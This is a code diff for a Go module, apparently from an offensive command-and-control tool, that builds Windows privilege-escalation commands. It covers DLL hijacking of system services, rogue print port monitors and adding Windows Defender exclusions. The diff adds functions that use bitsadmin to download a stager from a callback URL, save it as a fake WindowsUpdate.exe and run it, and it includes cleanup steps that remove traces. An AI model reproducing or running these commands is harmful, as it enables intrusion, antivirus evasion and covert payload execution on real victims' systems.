@@ -523,11 +523,11 @@ func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
 			Description:    "Exploits DLL search order hijacking in SYSTEM service",
 			EscalationType: "Admin->System",
 			Commands: []string{
-				`copy "%s" "%WINDIR%\System32\version.dll"`,
+				`copy "%s" "%%WINDIR%%\System32\version.dll"`,
 				`sc stop "wscsvc"`,
 				`sc start "wscsvc"`,
 				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
-				`del "%WINDIR%\System32\version.dll"`,
+				`del "%%WINDIR%%\System32\version.dll"`,
 			},
 			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
 			NoiseLevel: "Low",
@@ -602,13 +602,13 @@ func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
 			Description:    "Installs port monitor DLL to execute as SYSTEM",
 			EscalationType: "Admin->System",
 			Commands: []string{
-				`copy "%s" "%WINDIR%\System32\UpdateMonitor.dll"`,
+				`copy "%s" "%%WINDIR%%\System32\UpdateMonitor.dll"`,
 				`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\UpdateMonitor" /v Driver /t REG_SZ /d "UpdateMonitor.dll" /f`,
 				`sc stop "Spooler"`,
 				`sc start "Spooler"`,
 				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
 				`reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\UpdateMonitor" /f`,
-				`del "%WINDIR%\System32\UpdateMonitor.dll"`,
+				`del "%%WINDIR%%\System32\UpdateMonitor.dll"`,
 			},
 			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
 			NoiseLevel: "Medium",
@@ -904,11 +904,11 @@ func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
 			Description:    "Exploits DLL search order in Windows Security Center service",
 			EscalationType: "Admin->System",
 			Commands: []string{
-				`copy "%s" "%WINDIR%\System32\version.dll"`,
+				`copy "%s" "%%WINDIR%%\System32\version.dll"`,
 				`sc stop "wscsvc"`,
 				`sc start "wscsvc"`,
 				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
-				`del "%WINDIR%\System32\version.dll"`,
+				`del "%%WINDIR%%\System32\version.dll"`,
 			},
 			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
 			NoiseLevel: "Low",
@@ -918,13 +918,13 @@ func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
 			Description:    "Exploits DLL search order via AppInit DLLs",
 			EscalationType: "Admin->System",
 			Commands: []string{
-				`copy "%s" "%WINDIR%\System32\user32.dll"`,
+				`copy "%s" "%%WINDIR%%\System32\user32.dll"`,
 				`reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "user32.dll" /f`,
 				`sc stop "winlogon"`,
 				`sc start "winlogon"`,
 				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
 				`reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /f`,
-				`del "%WINDIR%\System32\user32.dll"`,
+				`del "%%WINDIR%%\System32\user32.dll"`,
 			},
 			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
 			NoiseLevel: "Medium",
@@ -947,13 +947,13 @@ func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
 			Description:    "Exploits Print Spooler via port monitor (alternative to direct hijack)",
 			EscalationType: "Admin->System",
 			Commands: []string{
-				`copy "%s" "%WINDIR%\System32\PrintNightmare.dll"`,
+				`copy "%s" "%%WINDIR%%\System32\PrintNightmare.dll"`,
 				`reg add "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\PrintNightmare" /v Driver /t REG_SZ /d "PrintNightmare.dll" /f`,
 				`sc stop "Spooler"`,
 				`sc start "Spooler"`,
 				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
 				`reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\PrintNightmare" /f`,
-				`del "%WINDIR%\System32\PrintNightmare.dll"`,
+				`del "%%WINDIR%%\System32\PrintNightmare.dll"`,
 			},
 			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
 			NoiseLevel: "Medium",
@@ -976,12 +976,12 @@ func (l *LOLBinEscalation) GetAdminToSystemMethods() []LOLBinMethod {
 			Description:    "Adds exclusion via registry, drops payload, triggers scan",
 			EscalationType: "Admin->System",
 			Commands: []string{
-				`reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%TEMP%" /t REG_SZ /d "0" /f`,
-				`copy "%s" "%TEMP%\WindowsUpdate.exe"`,
+				`reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%%TEMP%%" /t REG_SZ /d "0" /f`,
+				`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %%TEMP%%\WindowsUpdate.exe`,
 				`wmic process call create "%%systemroot%%\System32\mpcmdrun.exe -Scan -ScanType QuickScan"`,
 				`cmd.exe /c "ping 127.0.0.1 -n 3 >nul"`,
-				`reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%TEMP%" /f`,
-				`del "%TEMP%\WindowsUpdate.exe"`,
+				`reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "%%TEMP%%" /f`,
+				`del "%%TEMP%%\WindowsUpdate.exe"`,
 			},
 			Detection:  `whoami | findstr "NT AUTHORITY\\SYSTEM"`,
 			NoiseLevel: "Medium",
@@ -1084,14 +1084,29 @@ func (l *LOLBinEscalation) GenerateSpawnCommand(callbackURL string, targetPriv s
 	// For Admin->System escalation, we need a SIMPLE command that can be wrapped
 	// by the escalation method itself (not pre-wrapped in schtasks)
 	
-	tempFile := `%TEMP%\WindowsUpdate.exe`
+	tempFile := `%%TEMP%%\WindowsUpdate.exe`
 	
 	// Simple download and execute command - NO QUOTES, NO NESTED COMMANDS
 	// This will be wrapped by the escalation method (schtasks, sc, etc.)
+	// Use %% to escape % signs so fmt.Sprintf doesn't interpret them
 	downloadAndExec := fmt.Sprintf(`bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s && start /b "" %s`, callbackURL, tempFile, tempFile)
 	
 	// Return the simple command - the escalation method will wrap it appropriately
 	return downloadAndExec
+}
+
+// GenerateSpawnFilePath returns a file path for methods that need a file (like copy commands)
+func (l *LOLBinEscalation) GenerateSpawnFilePath(callbackURL string) string {
+	// Some methods need a file path, not a command
+	// They will download and execute the file themselves
+	return `%%TEMP%%\WindowsUpdate.exe`
+}
+
+// GenerateSpawnCommandForExec generates a command wrapped in cmd.exe /c for execution
+func (l *LOLBinEscalation) GenerateSpawnCommandForExec(callbackURL string, targetPriv string) string {
+	// For methods that need a command wrapped in cmd.exe /c
+	tempFile := `%%TEMP%%\WindowsUpdate.exe`
+	return fmt.Sprintf(`cmd.exe /c "bitsadmin /transfer MicrosoftUpdate /download /priority normal %s/stager %s && start /b "" %s"`, callbackURL, tempFile, tempFile)
 }
 
 // DetectPrivilegeLevel uses native Windows commands to detect privilege level
